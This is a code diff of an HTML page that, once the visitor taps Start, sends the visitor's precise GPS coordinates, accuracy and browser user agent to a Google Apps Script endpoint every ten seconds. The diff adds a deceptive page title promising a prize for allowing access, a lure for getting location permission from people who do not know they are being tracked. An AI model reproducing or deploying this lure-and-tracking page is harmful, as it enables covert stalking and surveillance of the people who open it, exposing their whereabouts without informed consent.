@@ -1,53 +1,82 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Tracker</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>You May Win a Prize Allow Access</title>
+  <style>
+    body { font-family: sans-serif; padding: 16px; }
+    #log { white-space: pre-wrap; font-family: monospace; font-size: 12px;
+           background: #f4f4f4; padding: 8px; border-radius: 6px;
+           max-height: 60vh; overflow: auto; }
+    button { padding: 12px 18px; font-size: 16px; }
+  </style>
 </head>
 <body>
-<h2>Run2</h2>
+  <h2>Location Tracker</h2>
+  <p>Tap <b>Start</b> and allow location when prompted.</p>
+  <button id="startBtn">Start</button>
+  <div id="status">Idle.</div>
+  <h3>Log</h3>
+  <div id="log"></div>
 
 <script>
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzBBkwEtBqkNF4pepUO8hfVX0TIyhvvkAJrqMEaV877E0jTPDbVnWCeGP3QOwR2Gj8J/exec";
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzP5FPfucaAV02pV9dNWTfbZKPr94f3CGzKrh2cTddzXFC-Bg_VQYBieAkEk7qTC9Op/exec";
+
+const statusEl = document.getElementById("status");
+const logEl    = document.getElementById("log");
+
+function log(msg) {
+  const ts = new Date().toLocaleTimeString();
+  logEl.textContent = "[" + ts + "] " + msg + "\n" + logEl.textContent;
+  console.log(msg);
+}
+function setStatus(msg) { statusEl.textContent = msg; }
 
 function sendLocation(position) {
   const data = {
-    latitude: position.coords.latitude,
+    latitude:  position.coords.latitude,
     longitude: position.coords.longitude,
-    accuracy: position.coords.accuracy,
-    userAgent: navigator.userAgent
+    accuracy:  position.coords.accuracy,
+    userAgent: navigator.userAgent,
+    ts:        new Date().toISOString()
   };
+  log("Got fix: " + data.latitude.toFixed(5) + ", " + data.longitude.toFixed(5)
+      + " (\u00b1" + Math.round(data.accuracy) + "m). Sending...");
 
+  // text/plain avoids a CORS preflight that Apps Script does not answer.
+  // The server JSON.parse's the body.
   fetch(SCRIPT_URL, {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
+    mode: "no-cors",
+    headers: { "Content-Type": "text/plain;charset=utf-8" },
     body: JSON.stringify(data)
   })
-  .then(res => res.json())
-  .then(data => console.log("Sent:", data))
-  .catch(err => console.error("Error:", err));
+  .then(() => { log("POST sent."); setStatus("Last sent: " + new Date().toLocaleTimeString()); })
+  .catch(err => log("POST error: " + err));
+}
+
+function geoError(err) {
+  log("Geolocation error " + err.code + ": " + err.message);
+  setStatus("Location error: " + err.message);
 }
 
 function getLocation() {
+  if (!("geolocation" in navigator)) { log("Geolocation API not available."); return; }
   navigator.geolocation.getCurrentPosition(
     sendLocation,
-    err => console.error(err),
-    { enableHighAccuracy: true }
+    geoError,
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
 
-// Send immediately
-getLocation();
-
-// Send every 10 sec
-setInterval(getLocation, 10000);
+document.getElementById("startBtn").addEventListener("click", () => {
+  setStatus("Requesting location permission...");
+  log("Start tapped.");
+  getLocation();
+  setInterval(getLocation, 10000);
+});
 </script>
 
 </body>
-
 </html>
-
-
-
-
